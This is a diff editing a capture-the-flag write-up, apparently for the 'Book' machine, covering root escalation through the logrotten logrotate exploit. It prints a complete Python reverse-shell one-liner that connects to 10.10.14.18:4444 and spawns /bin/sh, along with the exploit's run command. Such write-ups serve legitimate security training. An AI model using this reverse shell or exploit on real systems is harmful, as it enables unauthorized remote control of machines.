@@ -530,16 +530,14 @@ include /etc/logrotate.d
 
 Actually, we already knew that it is “create” because we saw the files in our home directory, but it is better to check.
 
-Now, we have to prepare a payload file. We edit a payload file `reader@book:~$ nano payload` and write the following classic Python reverse shell code:
+Now, we have to prepare a payload file. We edit a payload file `reader@book:~$ nano payload` and write the following classic Python reverse shell code as its content:
 
 ~~~
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ~~~
 
-Of course we save it and make it executable with `reader@book:~$ chmod +x payload`.
 
-
-Now, we compile the exploit, download it on the target, then run it:
+Now, we download the exploit on the target, compile it, and then run it:
 ~~~
 reader@book:~$ ./logrotten -p ./payload /home/reader/backups/access.log
 Waiting for rotating /home/reader/backups/access.log...
